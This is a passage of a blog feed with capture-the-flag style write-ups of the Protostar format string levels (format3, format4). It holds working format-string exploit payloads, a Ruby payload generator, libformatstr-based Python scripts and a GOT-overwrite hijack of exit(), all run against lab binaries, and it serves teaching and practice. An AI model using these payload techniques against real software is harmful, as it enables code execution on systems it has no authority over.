</span><span class='line'><span class="sr">&lt;p&gt;hob = shellcode_addr[2,4].to_i(16)</span>
</span><span class='line'><span class="sr">lob = shellcode_addr[6,4].to_i(16)</span>
</span><span class='line'><span class="sr">addr = target_addr[2,8]</span>
</span><span class='line'><span class="sr">o = offset.to_i&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">a</span> <span class="o">=</span> <span class="o">[]</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">hob</span> <span class="o">&gt;</span> <span class="n">lob</span><span class="p">)</span>
</span><span class='line'>    <span class="n">f</span> <span class="o">=</span> <span class="n">lob</span> <span class="o">-</span> <span class="mi">8</span><span class="p">;</span> <span class="n">s</span> <span class="o">=</span> <span class="n">hob</span> <span class="o">-</span> <span class="n">lob</span><span class="p">;</span> <span class="n">a</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="n">addr</span><span class="p">;</span> <span class="n">a</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">%</span><span class="mi">08</span><span class="n">x</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">%</span> <span class="p">(</span><span class="n">addr</span><span class="o">.</span><span class="n">to_i</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span>
</span><span class='line'><span class="k">else</span>
</span><span class='line'>    <span class="n">f</span> <span class="o">=</span> <span class="n">hob</span> <span class="o">-</span> <span class="mi">8</span><span class="p">;</span> <span class="n">s</span> <span class="o">=</span> <span class="n">lob</span> <span class="o">-</span> <span class="n">hob</span><span class="p">;</span> <span class="n">a</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">%</span><span class="mi">08</span><span class="n">x</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">%</span> <span class="p">(</span><span class="n">addr</span><span class="o">.</span><span class="n">to_i</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">);</span> <span class="n">a</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="n">addr</span>
</span><span class='line'><span class="k">end</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;puts &amp;ldquo;ruby -e &amp;lsquo;print [0x</span><span class="si">#{</span><span class="n">a</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="si">}</span><span class="sr">].pack(\&quot;V\&amp;rdquo;) + [0x</span><span class="si">#{</span><span class="n">a</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span><span class="si">}</span><span class="sr">].pack(\&amp;ldquo;V\&amp;rdquo;) + \&amp;ldquo;%</span><span class="si">#{</span><span class="n">o</span><span class="si">}</span><span class="sr">\$</span><span class="si">#{</span><span class="n">f</span><span class="si">}</span><span class="sr">x%</span><span class="si">#{</span><span class="n">o</span><span class="si">}</span><span class="sr">\$hn%</span><span class="si">#{</span><span class="n">o</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="sr">\$</span><span class="si">#{</span><span class="n">s</span><span class="si">}</span><span class="sr">x%</span><span class="si">#{</span><span class="n">o</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="sr">\$hn\&amp;rdquo;&amp;rsquo;&amp;ldquo;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ruby1.9.1 ./formatter.rb 12:0x080496f4:0x01025544
</span><span class='line'>ruby -e &lsquo;print [0x080496f6].pack(&ldquo;V&rdquo;) + [0x080496f4].pack(&ldquo;V&rdquo;) + &ldquo;%12\$250x%12\$hn%13\$21570x%13\$hn&rdquo;&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ ruby -e &lsquo;print [0x080496f6].pack(&ldquo;V&rdquo;) + [0x080496f4].pack(&ldquo;V&rdquo;) + &ldquo;%12\$250x%12\$hn%13\$21570x%13\$hn&rdquo;&rsquo; | /opt/protostar/bin/format3
</span><span class='line'>&hellip;
</span><span class='line'>80496f4you have modified the target :)</span></code></pre></td></tr></table></div></figure></p>

<p>The challenge could be also solved with <a href="https://github.com/hellman/libformatstr">hellman&rsquo;s libformatstr.py</a>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ git clone &lt;a href="https://github.com/hellman/libformatstr">https://github.com/hellman/libformatstr&lt;/a>
</span><span class='line'>Cloning into libformatstr&hellip;
</span><span class='line'>remote: Counting objects: 51, done.
</span><span class='line'>remote: Total 51 (delta 0), reused 0 (delta 0), pack-reused 51
</span><span class='line'>Unpacking objects: 100% (51/51), done.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ cd libformatstr/</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><figcaption><span>exploit-format3.py </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">env</span> <span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">libformatstr</span> <span class="kn">import</span> <span class="n">FormatStr</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">destination</span>   <span class="o">=</span> <span class="mh">0x080496f4</span>
</span><span class='line'><span class="n">what_to_write</span> <span class="o">=</span> <span class="mh">0x01025544</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">p</span> <span class="o">=</span> <span class="n">FormatStr</span><span class="p">()</span>
</span><span class='line'><span class="n">p</span><span class="p">[</span><span class="n">destination</span><span class="p">]</span> <span class="o">=</span> <span class="n">what_to_write</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">buf</span> <span class="ow">is</span> <span class="mi">12</span><span class="n">th</span> <span class="n">argument</span><span class="p">,</span> <span class="mi">0</span> <span class="nb">bytes</span> <span class="n">are</span> <span class="n">already</span> <span class="n">printed</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">payload</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="n">start_len</span><span class="o">=</span><span class="mi">0</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~/libformatstr$ python ./exploit-format3.py  | /opt/protostar/bin/format3
</span><span class='line'>&hellip;
</span><span class='line'> p??you have modified the target :)</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Format4</h2>

<p><figure class='code'><figcaption><span>format4.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">target</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">hello</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">code</span> <span class="n">execution</span> <span class="n">redirected</span><span class="o">!</span> <span class="n">you</span> <span class="n">win</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">vuln</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">vuln</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ruby -e &lsquo;print &ldquo;DDDD&rdquo; + &ldquo; %p&rdquo; * 25&rsquo; | /opt/protostar/bin/format4
</span><span class='line'>DDDD 0x200 0xb7fd8420 0xbffff5b4 0x44444444 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x702520 0x1000 0x1&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ ruby -e &lsquo;print &ldquo;DDDD %4\$p&rdquo;&rsquo; | /opt/protostar/bin/format4
</span><span class='line'>DDDD 0x44444444&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ objdump -TR /opt/protostar/bin/format4&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>/opt/protostar/bin/format4:     file format elf32-i386&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>DYNAMIC SYMBOL TABLE:
</span><span class='line'>00000000  w   D  &lt;em>UND&lt;/em>  00000000              &lt;strong>gmon_start&lt;/strong>
</span><span class='line'>00000000      DF &lt;em>UND&lt;/em>  00000000  GLIBC_2.0   fgets
</span><span class='line'>00000000      DF &lt;em>UND&lt;/em>  00000000  GLIBC_2.0   &lt;em>&lt;em>libc_start_main
</span><span class='line'>00000000      DF &lt;em>UND&lt;/em>  00000000  GLIBC_2.0   &lt;/em>exit
</span><span class='line'>00000000      DF &lt;em>UND&lt;/em>  00000000  GLIBC_2.0   printf
</span><span class='line'>00000000      DF &lt;em>UND&lt;/em>  00000000  GLIBC_2.0   puts
</span><span class='line'>00000000      DF &lt;em>UND&lt;/em>  00000000  GLIBC_2.0   exit
</span><span class='line'>080485ec g    DO .rodata    00000004  Base        &lt;/em>IO_stdin_used
</span><span class='line'>08049730 g    DO .bss   00000004  GLIBC_2.0   stdin&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>DYNAMIC RELOCATION RECORDS
</span><span class='line'>OFFSET   TYPE              VALUE
</span><span class='line'>080496fc R_386_GLOB_DAT    &lt;strong>gmon_start&lt;/strong>
</span><span class='line'>08049730 R_386_COPY        stdin
</span><span class='line'>0804970c R_386_JUMP_SLOT   &lt;strong>gmon_start&lt;/strong>
</span><span class='line'>08049710 R_386_JUMP_SLOT   fgets
</span><span class='line'>08049714 R_386_JUMP_SLOT   &lt;em>_libc_start_main
</span><span class='line'>08049718 R_386_JUMP_SLOT   &lt;/em>exit
</span><span class='line'>0804971c R_386_JUMP_SLOT   printf
</span><span class='line'>08049720 R_386_JUMP_SLOT   puts
</span><span class='line'>08049724 R_386_JUMP_SLOT   exit&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ objdump -d -j .plt /opt/protostar/bin/format4&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>/opt/protostar/bin/format4:     file format elf32-i386&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Disassembly of section .plt:&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>0804837c &lt;&lt;strong>gmon_start&lt;/strong>@plt-0x10>:
</span><span class='line'> 804837c:   ff 35 04 97 04 08       pushl  0x8049704
</span><span class='line'> 8048382:   ff 25 08 97 04 08       jmp    *0x8049708
</span><span class='line'> 8048388:   00 00                   add    %al,(%eax)
</span><span class='line'>    &hellip;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>0804838c &lt;&lt;strong>gmon_start&lt;/strong>@plt>:
</span><span class='line'> 804838c:   ff 25 0c 97 04 08       jmp    *0x804970c
</span><span class='line'> 8048392:   68 00 00 00 00          push   $0x0
</span><span class='line'> 8048397:   e9 e0 ff ff ff          jmp    804837c &lt;_init+0x30>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>0804839c &lt;fgets@plt>:
</span><span class='line'> 804839c:   ff 25 10 97 04 08       jmp    *0x8049710
</span><span class='line'> 80483a2:   68 08 00 00 00          push   $0x8
</span><span class='line'> 80483a7:   e9 d0 ff ff ff          jmp    804837c &lt;_init+0x30>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>080483ac &lt;&lt;em>_libc_start_main@plt>:
</span><span class='line'> 80483ac:   ff 25 14 97 04 08       jmp    *0x8049714
</span><span class='line'> 80483b2:   68 10 00 00 00          push   $0x10
</span><span class='line'> 80483b7:   e9 c0 ff ff ff          jmp    804837c &lt;&lt;/em>init+0x30>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>080483bc &lt;&lt;em>exit@plt>:
</span><span class='line'> 80483bc:   ff 25 18 97 04 08       jmp    *0x8049718
</span><span class='line'> 80483c2:   68 18 00 00 00          push   $0x18
</span><span class='line'> 80483c7:   e9 b0 ff ff ff          jmp    804837c &lt;&lt;/em>init+0x30>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>080483cc &lt;printf@plt>:
</span><span class='line'> 80483cc:   ff 25 1c 97 04 08       jmp    *0x804971c
</span><span class='line'> 80483d2:   68 20 00 00 00          push   $0x20
</span><span class='line'> 80483d7:   e9 a0 ff ff ff          jmp    804837c &lt;_init+0x30>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>080483dc &lt;puts@plt>:
</span><span class='line'> 80483dc:   ff 25 20 97 04 08       jmp    *0x8049720
</span><span class='line'> 80483e2:   68 28 00 00 00          push   $0x28
</span><span class='line'> 80483e7:   e9 90 ff ff ff          jmp    804837c &lt;_init+0x30>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>080483ec &lt;exit@plt>:
</span><span class='line'> 80483ec:   ff 25 24 97 04 08       jmp    *0x8049724
</span><span class='line'> 80483f2:   68 30 00 00 00          push   $0x30
</span><span class='line'> 80483f7:   e9 80 ff ff ff          jmp    804837c &lt;_init+0x30>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ nm /opt/protostar/bin/format4 | grep hello
</span><span class='line'>080484b4 T hello</span></code></pre></td></tr></table></div></figure></p>

<p>Using <code>Global Offset Table Hijacking</code> technique, we will try to overwrite the <code>0x08049724</code> address - jmp in <code>exit()</code>, with <code>0x080484b4</code> - symbol <code>hello</code>, at offset <code>4</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ruby1.9.1 ./formatter.rb 4:0x08049724:0x080484b4
</span><span class='line'>ruby -e &lsquo;print [0x08049726].pack(&ldquo;V&rdquo;) + [0x08049724].pack(&ldquo;V&rdquo;) + &ldquo;%4\$2044x%4\$hn%5\$31920x%5\$hn&rdquo;&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ ruby -e &lsquo;print [0x08049726].pack(&ldquo;V&rdquo;) + [0x08049724].pack(&ldquo;V&rdquo;) + &ldquo;%4\$2044x%4\$hn%5\$31920x%5\$hn&rdquo;&rsquo; | /opt/protostar/bin/format4
</span><span class='line'>&hellip;
</span><span class='line'>8049724code execution redirected! you win</span></code></pre></td></tr></table></div></figure></p>

<p>Correspondingly:</p>

<p><figure class='code'><figcaption><span>exploit-format4.py </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">env</span> <span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">libformatstr</span> <span class="kn">import</span> <span class="n">FormatStr</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">destination</span>   <span class="o">=</span> <span class="mh">0x08049724</span>
</span><span class='line'><span class="n">what_to_write</span> <span class="o">=</span> <span class="mh">0x080484b4</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">p</span> <span class="o">=</span> <span class="n">FormatStr</span><span class="p">()</span>
</span><span class='line'><span class="n">p</span><span class="p">[</span><span class="n">destination</span><span class="p">]</span> <span class="o">=</span> <span class="n">what_to_write</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">buf</span> <span class="ow">is</span> <span class="mi">4</span><span class="n">th</span> <span class="n">argument</span><span class="p">,</span> <span class="mi">0</span> <span class="nb">bytes</span> <span class="n">are</span> <span class="n">already</span> <span class="n">printed</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">payload</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">start_len</span><span class="o">=</span><span class="mi">0</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ libformatstr/exploit-format4.py | /opt/protostar/bin/format4
</span><span class='line'>&hellip;
</span><span class='line'>AAA&amp;$code execution redirected! you win</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Stack Levels)]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/27/exploit-exercises-protostar-stack-levels/"/>
    <updated>2015-06-27T09:46:35+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/27/exploit-exercises-protostar-stack-levels</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ wget &lt;a href="https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt">https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt&lt;/a> &ndash;no-check-certificate -O ~/.gdbinit -q</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Stack0</h2>

<p><figure class='code'><figcaption><span>stack0.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
